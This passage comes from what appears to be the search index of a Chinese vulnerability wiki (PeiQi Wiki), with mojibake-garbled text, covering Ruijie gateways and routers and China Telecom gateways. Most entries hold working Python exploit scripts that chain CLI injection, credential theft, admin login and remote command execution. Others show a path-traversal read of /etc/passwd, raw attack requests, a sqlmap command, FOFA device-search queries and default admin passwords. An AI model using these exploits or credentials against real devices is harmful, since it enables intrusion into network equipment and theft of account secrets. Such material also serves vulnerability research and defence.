true)); } } include_once(AROOT . \"init.php\"); //mvcåˆå§‹åŒ–å…¥å£ï¼Œæ”¾åœ¨åº•éƒ¨ å…³é”®éƒ¨åˆ†ä»£ç ä¸º /** * æ‰§è¡Œshellè„šæœ¬ */ public function shellAction() { $command = p(\"command\"); if ($command == false) { $data[\"status\"] = 2; $data[\"msg\"] = \"no command\"; json_echo($data); exit(); } $content = []; exec(EscapeShellCmd($command), $content); $data = array(\"status\" => true, \"data\" => $content); json_echo($data); } commandå‚æ•°ç›´æ¥ä¼ å…¥æ‰§è¡Œäº†å‘½ä»¤ å‘é€è¯·æ±‚åŒ… POST /cli.php?a=shell HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 24 Content-Type: application/x-www-form-urlencoded Cookie: RUIJIEID=nk5erth9i0pvcco3n7fbpa9bi0;user=admin; X-Requested-With: XMLHttpRequest Accept-Encoding: gzip notdelay=true&command=id æ¼æ´POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: é”æ·EGç½‘å…³ cli.php RCE \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] æ­£åœ¨æ‰§è¡Œ show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: password = re.findall(r'admin (.*?)\"', response.text)[0] print(\"\\033[36m[o] æˆåŠŸè·å–, è´¦å·å¯†ç ä¸º: admin {} \\033[0m\".format(password)) POC_2(target_url, password) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, password): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password={}'.format(password) try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] æ­£åœ¨ç™»å½•..... \\033[0m\".format(target_url)) if \"status\" in response.text and \"1\" in response.text and response.status_code == 200: ruijie_cookie = \"RUIJIEID=\" + re.findall(r\"'Set-Cookie': 'RUIJIEID=(.*?);\", str(response.headers))[0] + \";user=admin;\" print(\"\\033[36m[o] æˆåŠŸè·å–ç®¡ç†å‘˜Cookie: {} \\033[0m\".format(ruijie_cookie)) POC_3(target_url, ruijie_cookie) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, ruijie_cookie): vuln_url = target_url + \"/cli.php?a=shell\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(ruijie_cookie) } data = 'notdelay=true&command=cat /etc/passwd' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] æ­£åœ¨æ‰§è¡Œ cat /etc/passwd..... \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] æˆåŠŸè¯»å– /etc/passwd \\n[o] å“åº”ä¸º:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·EGæ˜“ç½‘å…³ ç®¡ç†å‘˜è´¦å·å¯†ç æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·EGæ˜“ç½‘å…³ ç®¡ç†å‘˜è´¦å·å¯†ç æ³„éœ²æ¼æ´.html","title":"é”æ·EGæ˜“ç½‘å…³ ç®¡ç†å‘˜è´¦å·å¯†ç æ³„éœ²æ¼æ´","keywords":"","body":"é”æ·EGæ˜“ç½‘å…³ ç®¡ç†å‘˜è´¦å·å¯†ç æ³„éœ²æ¼æ´ æ¼æ´æè¿° é”æ·EGæ˜“ç½‘å…³ login.phpå­˜åœ¨ CLIå‘½ä»¤æ³¨å…¥ï¼Œå¯¼è‡´ç®¡ç†å‘˜è´¦å·å¯†ç æ³„éœ²æ¼æ´ æ¼æ´å½±å“ [!NOTE] é”æ·EGæ˜“ç½‘å…³ FOFA [!NOTE] app=\"Ruijie-EGæ˜“ç½‘å…³\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´æ–‡ä»¶ login.php 1 || count(preg_split($reg, $password)) > 1) { $data[\"status\"] = 6; $data[\"msg\"] = \"username or password can't exist '\\r\\n'\"; json_echo($data); exit(); } if ($username == FALSE || $password == FALSE) { $data[\"status\"] = 5; $data[\"msg\"] = \"username or password can't empty\"; json_echo($data); exit(); } $res = execCli(\"exec\", \"webmaster $username $password\"); if ($res[\"status\"] != 1) { json_echo($res); exit(); } $isSuccess = trim($res[\"data\"]); if ($isSuccess == 0) { //ç”¨æˆ·åã€è´¦å·éªŒè¯æˆåŠŸ session_start(); $_SESSION['username'] = $username; //è®°å½•ç”¨æˆ·å $_SESSION[\"lasttime\"] = time(); //è®°å½•ç™»å½•æ—¶é—´ $config = @file_get_contents(DS . \"data\" . DS . \"web.config\"); //è·å–webé…ç½®ä¿¡æ¯ if ($config != false) { $config = unserialize($config); $_SESSION[\"timeout\"] = isset($config[\"loginTimeout\"]) ? $config[\"loginTimeout\"] * 60 : c(\"timeout\"); } else { $_SESSION[\"timeout\"] = c(\"timeout\"); } setcookie(\"user\", $_SESSION['username']); } $res[\"data\"] = $isSuccess; json_echo($res); } /** * è·å–è®¾å¤‡ä¿¡æ¯ */ function versionAction() { $info = $version = execCli(\"exec\", \"show version detail\", \"\"); $info[\"data\"] = preg_split(\"/\\r*\\n/\", $info[\"data\"]); json_echo($info); } } include_once(AROOT . \"init.php\"); //mvcåˆå§‹åŒ–å…¥å£ï¼Œæ”¾åœ¨åº•éƒ¨ å…³é”®ä»£ç éƒ¨åˆ† if ($username == FALSE || $password == FALSE) { $data[\"status\"] = 5; $data[\"msg\"] = \"username or password can't empty\"; json_echo($data); exit(); } $res = execCli(\"exec\", \"webmaster $username $password\"); if ($res[\"status\"] != 1) { json_echo($res); exit(); } $isSuccess = trim($res[\"data\"]); å‘é€è¯·æ±‚åŒ…ï¼Œæ‹¼æ¥ CLIæŒ‡ä»¤ show webmaster user POST /login.php HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 49 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Accept-Encoding: gzip username=admin&password=admin?show+webmaster+user æˆåŠŸè·å–è´¦å·å¯†ç  æ¼æ´POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: é”æ·EGç½‘å…³ ç®¡ç†å‘˜è´¦å·å¯†ç æ³„éœ² \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] æ­£åœ¨æ‰§è¡Œ show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: print(\"\\033[36m[o] æˆåŠŸè·å–, å“åº”ä¸º:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·EGæ˜“ç½‘å…³ download.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·EGæ˜“ç½‘å…³ download.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"é”æ·EGæ˜“ç½‘å…³ download.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"é”æ·EGæ˜“ç½‘å…³ download.php åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° é”æ·EGæ˜“ç½‘å…³ download.php å­˜åœ¨åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œå¯¼è‡´å¯ä»¥è¯»å–æœåŠ¡å™¨ä»»æ„æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] é”æ·EGæ˜“ç½‘å…³ FOFA [!NOTE] app=\"Ruijie-EGæ˜“ç½‘å…³\" æ¼æ´å¤ç° é¦–å…ˆç™»å½•åˆ°åå°ä¸­(å¯ä»¥ç»„åˆ é”æ·EGæ˜“ç½‘å…³ ç®¡ç†å‘˜è´¦å·å¯†ç æ³„éœ²æ¼æ´) æ¼æ´æ–‡ä»¶ download.php _checkfile(iconv(\"UTF-8\", \"GB2312\",$filepath)); if ($filepointer !== false) { if (headers_sent()) { $this->error = \"æ— æ³•ä¸‹è½½æ–‡ä»¶ï¼Œå·²ç»è¾“å‡ºå…¶ä»–è¯·æ±‚å¤´ï¼\"; } else { header(\"Pragma: public\"); header(\"Expires: 0\"); header(\"Cache-Control: must-revalidate, post-check=0, pre-check=0\"); header(\"Cache-Control: private\", false); header(\"Content-Type: {$this->_getMimeType($filename)}\"); header(\"Content-Disposition: attachment; filename=\\\"{$filename}\\\";\"); header(\"Content-Transfer-Encoding: binary\"); header(\"Content-Length: {$this->_getFileSize($filepointer)}\"); @ob_clean(); rewind($filepointer); fpassthru($filepointer); exit(); } } if ($this->error) { //æœ‰é”™è¯¯äº§ç”Ÿ ?> æ–‡ä»¶ä¸‹è½½å¤±è´¥ alert(\"error; ?>\"); true, \"data\" => $fileContent); json_echo($data); } } /** * æ–‡ä»¶æ£€æŸ¥ */ private function _checkfile($filename) { if ($filename == false) { $this->error = \"è¯·æŒ‡å®šè¦ä¸‹è½½çš„æ–‡ä»¶ï¼\"; return FALSE; } $isallow = false; foreach ($this->allow as $pattern) { if (preg_match($pattern, $filename)) { $isallow = true; break; } } if (!$isallow) { $this->error = \"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸‹è½½ï¼\"; return FALSE; } if (!is_file($filename)) { $this->error = \"è¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼\"; return FALSE; } else if (!is_readable($filename)) { //if (system(\"chmod +r \" . escapeshellarg($filename))) { $this->error = \"æ— æ³•ä¸‹è½½è¯¥æ–‡ä»¶ï¼Œæ²¡æœ‰æƒé™ï¼\"; return FALSE; //} } return fopen($filename, \"rb\"); } /** * è·å–æ–‡ä»¶mimeç±»å‹ * @param string $fileName æ–‡ä»¶å * @return string */ private function _getMimeType($fileName) { $charset = v(\"charset\"); switch (pathinfo($fileName, PATHINFO_EXTENSION)) { case \"pdf\": return \"application/pdf\"; case \"exe\": return \"application/octet-stream\"; case \"zip\": return \"application/zip\"; case \"doc\": return \"application/msword\"; case \"xls\": return \"application/vnd.ms-excel\"; case \"ppt\": return \"application/vnd.ms-powerpoint\"; case \"gif\": return \"image/gif\"; case \"png\": return \"image/png\"; case \"jpeg\": case \"jpg\": return \"image/jpg\"; case \"htm\": return \"text/html;charset=gbk\"; case \"html\": if(!$charset) { return \"text/html;charset=gbk\"; }else { return \"text/html;charset=UTF-8\"; } default: return \"application/force-download\"; } } /** * è·å–æ–‡ä»¶å¤§å° * @return int */ private function _getFileSize($filePointer) { $stat = fstat($filePointer); return $stat['size']; } } include_once AROOT.'init.php'; //mvcåˆå§‹åŒ–å…¥å£ï¼Œæ”¾åœ¨åº•éƒ¨ å…³é”®ä»£ç ä¸º /** * è¯»å–æ–‡æœ¬æ–‡ä»¶å†…å®¹ï¼Œæ”¯æŒajaxè¯·æ±‚ */ public function read_txtAction() { $filename = v(\"file\"); if (!file_exists($filename)) { $data[\"status\"] = 2; $data[\"msg\"] = $filename . \"ä¸å­˜åœ¨\"; json_echo($data); exit(); } else { $fileContent = file_get_contents($filename); $data = array(\"status\" => true, \"data\" => $fileContent); json_echo($data); } } ç›´æ¥ä»Getè¯·æ±‚ä¸­æå– fileå‚æ•°è¯»å–æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ ../ è·³è½¬ç›®å½• éªŒè¯POC /download.php?a=read_txt&file=../../../../etc/passwd æ¼æ´POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: é”æ·EGç½‘å…³ cli.php RCE \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] æ­£åœ¨æ‰§è¡Œ show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: password = re.findall(r'admin (.*?)\"', response.text)[0] print(\"\\033[36m[o] æˆåŠŸè·å–, è´¦å·å¯†ç ä¸º: admin {} \\033[0m\".format(password)) POC_2(target_url, password) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, password): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password={}'.format(password) try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] æ­£åœ¨ç™»å½•..... \\033[0m\".format(target_url)) if \"status\" in response.text and \"1\" in response.text and response.status_code == 200: ruijie_cookie = \"RUIJIEID=\" + re.findall(r\"'Set-Cookie': 'RUIJIEID=(.*?);\", str(response.headers))[0] + \";user=admin;\" print(\"\\033[36m[o] æˆåŠŸè·å–ç®¡ç†å‘˜Cookie: {} \\033[0m\".format(ruijie_cookie)) POC_3(target_url, ruijie_cookie) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, ruijie_cookie): vuln_url = target_url + \"/download.php?a=read_txt&file=../../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(ruijie_cookie) } try: response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] æ­£åœ¨è¯»å– /etc/passwd..... \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] æˆåŠŸè¯»å– /etc/passwd \\n[o] å“åº”ä¸º:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·NBR 1300Gè·¯ç”±å™¨ è¶ŠæƒCLIå‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·NBR 1300Gè·¯ç”±å™¨ è¶ŠæƒCLIå‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"é”æ·NBR 1300Gè·¯ç”±å™¨ è¶ŠæƒCLIå‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"é”æ·NBR 1300Gè·¯ç”±å™¨ è¶ŠæƒCLIå‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° é”æ·NBR 1300Gè·¯ç”±å™¨ è¶ŠæƒCLIå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œguestè´¦æˆ·å¯ä»¥è¶Šæƒè·å–ç®¡ç†å‘˜è´¦å·å¯†ç  æ¼æ´å½±å“ [!NOTE] é”æ·NBRè·¯ç”±å™¨ FOFA [!NOTE] title=\"é”æ·ç½‘ç»œ --NBRè·¯ç”±å™¨--ç™»å½•ç•Œé¢\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æŸ¥çœ‹æµé‡å‘ç° CLIå‘½ä»¤æµé‡ è¯·æ±‚åŒ…ä¸º POST /WEB_VMS/LEVEL15/ HTTP/1.1 Host: Connection: keep-alive Content-Length: 73 Authorization: Basic User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: auth=; user= x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 command=show version&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant. æµ‹è¯•å‘ç°æ‰§è¡Œå…¶ä»–å‘½ä»¤éœ€è¦æƒé™ï¼ŒæŸ¥çœ‹æ‰‹å†Œå‘ç°å­˜åœ¨ä½æƒé™ guestè´¦æˆ·ï¼ˆguest/guestï¼‰ ç™»å½•åå‘é€è¯·æ±‚åŒ…ï¼Œæ‰§è¡ŒCLIå‘½ä»¤ (show webmaster user) æŸ¥çœ‹ç”¨æˆ·é…ç½®è´¦å·å¯†ç  æˆåŠŸè·å–æ‰€æœ‰ç”¨æˆ·çš„è´¦å·å¯†ç  webmaster level 0 username admin password guest webmaster level 0 username guest password guest æ¼æ´POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: é”æ·NBRNBR1300G è·¯ç”±å™¨ è¶ŠæƒCLIå‘½ä»¤æ‰§è¡Œæ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/WEB_VMS/LEVEL15/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } data = 'command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] æ­£åœ¨æ‰§è¡Œ show webmaster user \\033[0m\".format(target_url)) if \"webmaster\" in response.text and \" password\" in response.text and response.status_code == 200: user_data = re.findall(r'webmaster level 0 username admin password (.*?)', response.text)[0] print(\"\\033[36m[o] æˆåŠŸè·å–, ç®¡ç†å‘˜ç”¨æˆ·è´¦å·å¯†ç ä¸º: admin/{} \\033[0m\".format(user_data)) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·ISG è´¦å·å¯†ç æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·ISG è´¦å·å¯†ç æ³„éœ²æ¼æ´.html","title":"é”æ·ISG è´¦å·å¯†ç æ³„éœ²æ¼æ´","keywords":"","body":"é”æ·ISG è´¦å·å¯†ç æ³„éœ²æ¼æ´ æ¼æ´æè¿° é”æ·ISG å­˜åœ¨è´¦å·å¯†ç æ³„éœ²æ¼æ´ï¼Œé€šè¿‡æŸ¥çœ‹å‰ç«¯ï¼Œå¯ä»¥è·å–å¯†ç çš„md5å€¼, è§£å¯†åè·å–åå°æƒé™ æ¼æ´å½±å“ [!NOTE] é”æ·ISG FOFA [!NOTE] title=\"RG-ISG\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ F12 æŸ¥çœ‹åˆ°è´¦å·å¯†ç  è§£å¯†md5 åç™»é™†ç³»ç»Ÿ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 19:17:40 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç”µä¿¡/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç”µä¿¡/","title":"ç”µä¿¡","keywords":"","body":"ç”µä¿¡ ç”µä¿¡ç½‘å…³é…ç½®ç®¡ç†ç³»ç»Ÿ SQLæ³¨å…¥æ¼æ´ ç”µä¿¡ä¸­å…´ZXHN F450Aç½‘å…³ é»˜è®¤ç®¡ç†å‘˜è´¦å·å¯†ç æ¼æ´ ç”µä¿¡å¤©ç¿¼ç½‘å…³F460 web_shell_cmd.gch è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-08 13:24:19 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç”µä¿¡/ç”µä¿¡ç½‘å…³é…ç½®ç®¡ç†ç³»ç»Ÿ SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç”µä¿¡/ç”µä¿¡ç½‘å…³é…ç½®ç®¡ç†ç³»ç»Ÿ SQLæ³¨å…¥æ¼æ´.html","title":"ç”µä¿¡ç½‘å…³é…ç½®ç®¡ç†ç³»ç»Ÿ SQLæ³¨å…¥æ¼æ´","keywords":"","body":"ç”µä¿¡ç½‘å…³é…ç½®ç®¡ç†ç³»ç»Ÿ SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° ç”µä¿¡ç½‘å…³é…ç½®ç®¡ç†ç³»ç»Ÿ å‰å°ç™»é™†é¡µé¢ç”¨æˆ·åå‚æ•°å­˜åœ¨SQLæ³¨å…¥æ¼æ´ æ¼æ´å½±å“ [!NOTE] ç”µä¿¡ç½‘å…³é…ç½®ç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] body=\"src=\\\"img/dl.gif\\\"\" && title=\"ç³»ç»Ÿç™»å½•\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ è®¾å¤‡å­˜åœ¨é»˜è®¤å¼±å£ä»¤ admin/admin ç™»å½•çš„è¯·æ±‚åŒ…ä¸º POST /manager/login.php HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 53 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=2lfi6enp5gehalrb92594c80i6 Connection: close Name=admin&Pass=admin ä¿å­˜ä¸ºæ–‡ä»¶ä½¿ç”¨ Sqlmapå·¥å…·ï¼Œæ³¨å…¥ç‚¹ä¸º Nameå‚æ•° sqlmap -r sql-1.txt -p Name --risk 3 Goby & POC [!NOTE] Hsmedia Hgateway default account PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç”µä¿¡/ç”µä¿¡ä¸­å…´ZXHN F450Aç½‘å…³ é»˜è®¤ç®¡ç†å‘˜è´¦å·å¯†ç æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç”µä¿¡/ç”µä¿¡ä¸­å…´ZXHN F450Aç½‘å…³ é»˜è®¤ç®¡ç†å‘˜è´¦å·å¯†ç æ¼æ´.html","title":"ç”µä¿¡ä¸­å…´ZXHN F450Aç½‘å…³ é»˜è®¤ç®¡ç†å‘˜è´¦å·å¯†ç æ¼æ´","keywords":"","body":"ç”µä¿¡ä¸­å…´ZXHN F450Aç½‘å…³ é»˜è®¤ç®¡ç†å‘˜è´¦å·å¯†ç æ¼æ´ æ¼æ´æè¿° ç”µä¿¡ä¸­å…´ZXHN F450Aç½‘å…³ å­˜åœ¨é»˜è®¤ç®¡ç†å‘˜è´¦å·å¯†ç  æ¼æ´å½±å“ [!NOTE] ç”µä¿¡ä¸­å…´ZXHN F450Aç½‘å…³ FOFA [!NOTE] ZXHN F450A æ¼æ´æè¿° ç™»å½•é¡µé¢å¦‚ä¸‹ user/pass useradmin/nE7jA%5m æ™®é€šç®¡ç†å‘˜ telecomadmin/nE7jA%5m è¶…çº§ç®¡ç†å‘˜ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ç”µä¿¡/ç”µä¿¡å¤©ç¿¼ç½‘å…³F460 